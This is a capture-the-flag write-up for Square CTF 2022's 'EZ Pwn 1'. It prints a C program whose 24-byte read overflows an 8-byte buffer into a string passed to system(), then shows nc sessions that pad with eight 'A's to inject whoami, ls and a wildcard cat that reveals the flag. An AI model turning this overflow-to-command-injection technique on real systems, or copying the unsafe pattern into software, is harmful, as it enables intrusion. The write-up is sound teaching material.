# EZ Pwn 1, Pwn, 50pts

Memory safety? Whats that?
Required Reading:
- https://en.wikipedia.org/wiki/Stack_buffer_overflow

## Problem

We are given the source code of C program, which contains buffer overflow error:

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


int main()
{
    char command[16];
    char way_too_small_input_buf[8];
    strcpy(command, "ls");

    puts("Hi! would you like me to ls the current directory?");
    read(0, way_too_small_input_buf, 24);
    if (!strcmp(way_too_small_input_buf, "no\n")) {
        puts("Oh, ok :(");
        exit(0);
    }

    puts("Ok, here ya go!\n");
    system(command);

}
```

Our goal is to get the flag located somewhere on `chals.2022.squarectf.com:4100`

## Solution

From looking at the source code, we can see two `char[]` types being declared.
The first one is a `command` string of 16 characters and the second one is an input controlled by an attacker - a string `way_too_small_input_buf` of 8 characters. The way how they will be put on stack means that if we overfill `way_too_small_input_buf`, it starts to overwrite the content of `command`. Execution of the `system(command)` line gives us an opportunity to run injected commands on the remote machine. The only caveat here is that our payload can't be longer than 24 characters in total (the rest of the input is going to be truncated).

Let's try see if we can execute our own command then. First 8 characters of our input does not matter as they won't become the part of the `command` variable, so it's just a filler to get us to the beginning of `command` characters array:

```
$ nc chals.2022.squarectf.com 4100
Hi! would you like me to ls the current directory?
AAAAAAAAwhoami
Ok, here ya go!

pwnable_user
```

That seems to work as expected:

- `AAAAAAAA` fills out `way_too_small_input_buf` characters array
- then, there is `whoami` command, which overwrites `command` buffer, located next to `way_too_small_input_buf` in memory
- our injected command is then executed

Let's figure out where the flag is:

```$ nc chals.2022.squarectf.com 4100
Hi! would you like me to ls the current directory?
AAAAAAAAls -lRA
Ok, here ya go!

.:
total 28
-rw-r--r-- 1 root pwnable_user  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 root pwnable_user 3771 Jan  6  2022 .bashrc
-rw-r--r-- 1 root pwnable_user  807 Jan  6  2022 .profile
-r-xr-x--- 1 root pwnable_user 8528 Nov  6 21:09 ez-pwn-1
drwxr-xr-x 1 root pwnable_user 4096 Nov  9 04:49 the_flag_is_in_here

./the_flag_is_in_here:
total 4
-r--r----- 1 root pwnable_user 64 Nov  6 21:09 flag.txt
```

We can see the flag file is located in `./the_flag_is_in_here` directory. To display the flag, we need to execute command similar to this one:

```
cat ./the_flag_is_in_here/flag.txt
```

The problemn here is that we have only 16 characters to use, because this is the size of `command` characters array used in `system(command);` execution and our payload has 35 characters. We need to shorten it to maximum 16 characters.

To be able to do so, we can use wildcard character (`*`), whcih is going to be expanded by shell. Here's one of the examples:

```
cat ./the*/*.txt
```

In the example above, `the*` is going to be expanded to `the_flag_is_in_here` (because there is no other directory with the name starting from `the`) and `*.txt` will expand to `flag.txt`. We can even make it shorter:

```
cat ./t*/*
```

Let's see if this will work:

```
$ nc chals.2022.squarectf.com 4100
Hi! would you like me to ls the current directory?
AAAAAAAAcat ./t*/*
Ok, here ya go!

flag{congrats_youve_exploited_a_memory_corruption_vulnerability}
```

And we get the flag - `flag{congrats_youve_exploited_a_memory_corruption_vulnerability}` and 50 points :)


